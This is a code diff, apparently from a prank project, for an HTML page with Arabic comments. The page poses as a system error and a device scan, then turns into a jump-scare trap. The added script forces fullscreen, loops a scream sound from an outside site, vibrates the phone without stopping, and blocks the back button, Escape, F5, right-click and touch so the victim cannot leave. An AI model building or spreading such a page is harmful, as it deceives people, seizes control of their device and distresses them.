@@ -1,33 +1,101 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Error</title>
 <style>
-body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding-top: 50%; margin: 0; overflow: hidden;}
+body { 
+    background: #000; color: #0f0; font-family: sans-serif; text-align: center; 
+    padding-top: 40%; margin: 0; overflow: hidden; 
+    -webkit-touch-callout: none; -webkit-user-select: none; user-select: none;
+}
 h2 { font-size: 24px; }
 .bar { width: 80%; height: 20px; background: #333; margin: 20px auto; border-radius: 10px; }
-.fill { width: 0%; height: 100%; background: #0f0; border-radius: 10px; animation: load 4s forwards; }
+.fill { width: 0%; height: 100%; background: #0f0; border-radius: 10px; animation: load 3s forwards; }
 @keyframes load { 100% { width: 100%; } }
-#scare { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: #000; z-index: 999;}
-#scare img { width: 100%; height: 100%; object-fit: cover; }
+#scare { 
+    display: none; position: fixed; top:0; left:0; width:100vw; height:100vh; 
+    background: #000; z-index: 9999; overflow: hidden;
+}
+#scare img { 
+    width: 100%; height: 100%; object-fit: cover; 
+    animation: shake 0.1s infinite; /* اهتزاز مستمر */
+}
+@keyframes shake {
+  0% { transform: translate(2px, 1px) rotate(0deg); }
+  10% { transform: translate(-1px, -2px) rotate(-1deg); }
+  20% { transform: translate(-3px, 0px) rotate(1deg); }
+  30% { transform: translate(3px, 2px) rotate(0deg); }
+  40% { transform: translate(1px, -1px) rotate(1deg); }
+  50% { transform: translate(-1px, 2px) rotate(-1deg); }
+  60% { transform: translate(-3px, 1px) rotate(0deg); }
+  70% { transform: translate(3px, 1px) rotate(-1deg); }
+  80% { transform: translate(-1px, -1px) rotate(1deg); }
+  90% { transform: translate(1px, 2px) rotate(0deg); }
+  100% { transform: translate(1px, -2px) rotate(-1deg); }
+}
 </style>
 </head>
 <body>
+
 <div id="main">
-  <h2>جاري تحديث النظام...</h2>
+  <h2>جاري فحص الجهاز... لا تغلق الصفحة.</h2>
   <div class="bar"><div class="fill"></div></div>
 </div>
+
 <div id="scare">
   <img src="https://i.ibb.co/6PZ4Z9B/scary.jpg">
 </div>
+
 <script>
+// منع الرجوع للخلف أو إغلاق القائمة
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+    history.go(1);
+};
+
+// إخفاء المؤشر ومنع أي ضغطة تقفل الصفحة
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' || e.key === 'F5') {
+        e.preventDefault();
+        // إعادة تشغيل الصوت لو حاول يقفل
+        let a = new Audio('https://www.myinstants.com/media/sounds/screaming-sheep.mp3');
+        a.play();
+    }
+});
+
 setTimeout(() => {
+  // طلب ملء الشاشة (عشان يختفي شريط المتصفح)
+  let elem = document.documentElement;
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen().catch(err => console.log(err));
+  } else if (elem.webkitRequestFullscreen) {
+    elem.webkitRequestFullscreen();
+  }
+
+  // إظهار شاشة الرعب
   document.getElementById('main').style.display = 'none';
   document.getElementById('scare').style.display = 'block';
+  
+  // تشغيل الصوت بصوت عالي
   let a = new Audio('https://www.myinstants.com/media/sounds/screaming-sheep.mp3');
+  a.loop = true; // الصوت يكرر نفسه لين يطفي الجوال
   a.play();
-  if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
-}, 4000);
+
+  // اهتزاز مستمر
+  if(navigator.vibrate) {
+      setInterval(() => {
+          navigator.vibrate([1000, 500, 1000, 500]);
+      }, 1500);
+  }
+}, 3000);
+
+// منع أي لمسة تقفل الشاشة
+document.body.addEventListener('touchstart', function(e){
+    e.preventDefault();
+}, {passive: false});
 </script>
+
 </body>
 </html>
